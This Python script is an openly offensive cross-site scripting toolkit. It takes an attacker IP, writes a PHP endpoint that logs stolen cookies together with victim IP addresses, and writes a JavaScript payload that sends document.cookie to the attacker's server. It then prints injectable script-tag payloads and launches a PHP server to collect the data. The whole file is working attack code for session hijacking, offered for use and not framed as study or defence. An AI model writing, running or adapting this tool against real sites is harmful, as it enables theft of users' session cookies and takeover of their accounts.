from pathlib import Path
import subprocess
import argparse

parser = argparse.ArgumentParser(description="Create a PHP web server ready to use")
parser.add_argument("--ip", help="Attacker IP", required=True)
parser.add_argument("-p", "--port", default=8080, help="Web server port (If you want to use port 80, run the tool as sudo)")

server_dir = Path("/tmp/tmpserver")
server_dir.mkdir(parents=True, exist_ok=True)

args = parser.parse_args()
ip = args.ip
port = args.port

php_code = """<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
"""

js_code = f"""
        new Image().src='http://{ip}:{port}/index.php?c='+document.cookie;
"""

index = server_dir / "index.php"
index.write_text(php_code, encoding="utf-8")

script = server_dir / "script.js"
script.write_text(js_code, encoding="utf-8")

print(f"[+] Created: {index}")
print(f"[+] Payload: <script src='http://{ip}:{port}/script.js'></script>")
print(f"[+] Payload: '><script src='http://{ip}:{port}/script.js'></script>")

try:
    subprocess.run(
        ["php", "-S", f"0.0.0.0:{port}"],
        cwd=server_dir
    )
except FileNotFoundError:
    print("[!] PHP not found!")

